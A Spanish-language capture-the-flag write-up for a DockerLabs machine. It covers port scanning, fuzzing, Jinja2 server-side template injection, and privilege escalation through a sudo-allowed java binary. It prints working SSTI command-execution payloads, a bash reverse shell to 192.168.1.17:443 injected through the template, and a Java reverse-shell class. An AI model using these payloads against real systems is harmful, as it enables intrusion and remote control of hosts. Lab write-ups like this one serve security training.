# Fase 1- Tanteo

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8aa15be7-b94e-4c29-bd1c-8077346838e3)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **5000/tcp (UPNP):** -
### Puerto 80
Al identificar que el puerto 5000 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Junto con el puerto, esto llevo a una pagina de registro.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/99ea8e18-a399-431d-b9f8-564a8317f448)

# Fase 2- Exploración

#### /console
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/271733c1-fffc-4540-8405-63fe8a9d0fbf)
Realizando fuzzing con Feroxbuster encontré el un /console que nos pide un pin para ingresar.

# Fase 3- Explotación

#### 4?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ae2ef32e-73a6-42c6-aa66-9d1a15bec91f)

Si probamos inyectar un `{{2 + 2}}` en el campo PinguNombre nos devuelve un `Hello 4!` estamos inyectando codigo.

#### ssti
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/301c238f-3e89-4af3-ab51-6f4361adab58)

Probamos si es vulnerable a SSTI "Server-Side Template Injection" inyectamos este codigo:
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### Reverse shell
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/90f3df21-7447-4f2b-a17b-19d62728f301)
Enviamos una reverse shell de `PayloadsAllTheThings` pero la modifique para que sea en vez de Python, bash ya que Python me daba problemas. El comando es:
```python
{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.17/443 0>&1"').read().zfill(417)}} {% endif %} {% endfor %}
```

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/498d1409-0d6f-4a95-9351-29514c6d2a59)
Vemos que el binario que podemos ejecutar como root es java.

#### java
```java
import java.io.*;
import java.net.*;

public class ReverseShell {
       public static void main(String[] args) throws Exception {
           String ip = "192.168.1.17";
           int port = 443;
           rocess p = new ProcessBuilder("/bin/bash", "-c", "exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done").start();
           p.waitFor();
    } 
} 

```
Como no tenemos ningún archivo para ejecutar ni en gtfobins no nos aparece nada, busque una reverse shell con java y encontré esta.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ee963c42-8f15-4ed7-a546-6d2310c8768b)
La ejecute llamando al binario, y al nombre del archivo y me llego la reverse shell, somos root!


